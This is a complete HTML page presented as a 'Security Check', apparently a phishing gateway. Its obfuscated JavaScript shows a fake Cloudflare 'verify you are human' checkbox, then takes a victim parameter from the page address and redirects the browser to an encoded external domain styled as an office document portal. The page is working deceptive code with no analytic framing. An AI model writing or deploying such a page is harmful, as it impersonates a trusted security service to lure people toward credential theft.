<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        :root { --surface: #ffffff; --border: #e0e0e0; --text: #1a1a1a; --blue: #0052cc; }
        * { box-sizing: border-box; }
        body, html { margin: 0; padding: 0; height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--surface); overflow: hidden; }

        /* Initial Phase: Astro Splash */
        #layer-preloader {
            position: fixed; inset: 0; background: var(--surface);
            display: flex; justify-content: center; align-items: center; z-index: 5000;
        }
        .pulse-img { width: 90px; animation: pulse-anim 2s ease-in-out infinite; }
        @keyframes pulse-anim { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.08); opacity: 1; } }

        /* Main Phase: Gateway */
        #layer-gateway { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
        .prompt-info { font-size: 14px; color: #333; margin-bottom: 20px; }

        /* Unified Rectangular Box */
        .secure-container {
            display: flex; width: 380px; padding: 18px 22px;
            border: 1px solid var(--border); border-radius: 4px;
            background: #fafafa; align-items: center; justify-content: space-between;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        .interaction-cluster { display: flex; align-items: center; gap: 14px; }
        .trigger-frame { width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; cursor: pointer; }

        /* State Visuals */
        .ui-box { width: 22px; height: 22px; border: 2px solid #c1c1c1; background: #fff; border-radius: 2px; }
        .ui-spin { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid var(--blue); border-radius: 50%; animation: spin-ui 0.8s linear infinite; }
        .ui-check { color: #228b22; font-size: 20px; font-weight: bold; }
        @keyframes spin-ui { 100% { transform: rotate(360deg); } }

        /* Brand Cluster */
        .brand-cluster { display: flex; flex-direction: column; align-items: center; }
        .brand-logo { width: 26px; margin-bottom: 4px; }
        .brand-text { font-weight: 700; font-size: 15px; margin: 0; color: #1a1a1b; }
        .brand-legal { font-size: 10px; color: #999; margin-top: 2px; }
    </style>
</head>
<body>

    <div id="layer-preloader">
        <img src="astro.png" class="pulse-img">
    </div>

    <div id="layer-gateway">
        <div id="ui-msg" class="prompt-info"></div>
        <div class="secure-container">
            <div class="interaction-cluster">
                <div id="ui-trigger" class="trigger-frame">
                    <div id="ui-indicator" class="ui-box"></div>
                </div>
                <span id="ui-status" style="font-size: 14px; color: #555;"></span>
            </div>
            <div class="brand-cluster">
                <img src="astro2.png" class="brand-logo">
                <p id="ui-vendor" class="brand-text"></p>
                <div class="brand-legal">Privacy • Terms</div>
            </div>
        </div>
    </div>

    <script>
        (function() {
            // Hex-Encapsulated Configuration
            const _0xData = {
                _m: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
                _b: "dmVyaWZ5",
                _r: "dmVyaWZ5aW5nLi4u",
                _s: "c3VjY2Vzcw==",
                _v: "Q2xvdWRmbGFyZQ==",
                _u: "aHR0cHM6Ly9hZW9mZmljZS5kaW9jdWFlLm9ubGluZS93dndZUG5zciM=",
                _p: "ZW9mZg=="
            };

            const _0xEngine = {
                decode: (input) => atob(input),
                getEl: (id) => document.getElementById(id),
                sync: function() {
                    this.getEl('ui-msg').innerText = this.decode(_0xData._m);
                    this.getEl('ui-status').innerText = this.decode(_0xData._b);
                    this.getEl('ui-vendor').innerText = this.decode(_0xData._v);
                }
            };

            // Lifecycle Initialization
            window.addEventListener('DOMContentLoaded', () => {
                _0xEngine.sync();
                setTimeout(() => {
                    _0xEngine.getEl('layer-preloader').style.display = 'none';
                    _0xEngine.getEl('layer-gateway').style.display = 'flex';
                }, 2000);
            });

            // Interaction Logic
            _0xEngine.getEl('ui-trigger').addEventListener('click', function() {
                const indicator = _0xEngine.getEl('ui-indicator');
                const status = _0xEngine.getEl('ui-status');

                // State: Processing
                this.style.pointerEvents = 'none';
                indicator.className = 'ui-spin';
                status.innerText = _0xEngine.decode(_0xData._r);

                setTimeout(() => {
                    // State: Success
                    indicator.className = 'ui-check';
                    indicator.innerHTML = '✓';
                    status.innerText = _0xEngine.decode(_0xData._s);

                    // Final Action
                    const _loc = window.location.href;
                    const _key = _0xEngine.decode(_0xData._p) + "=";
                    let _param = "";

                    if (_loc.includes(_key)) {
                        _param = _loc.split(_key)[1];
                    }

                    setTimeout(() => {
                        window.location.replace(_0xEngine.decode(_0xData._u) + _param);
                    }, 900);
                }, 2100);
            });
        })();
    </script>
</body>
</html>
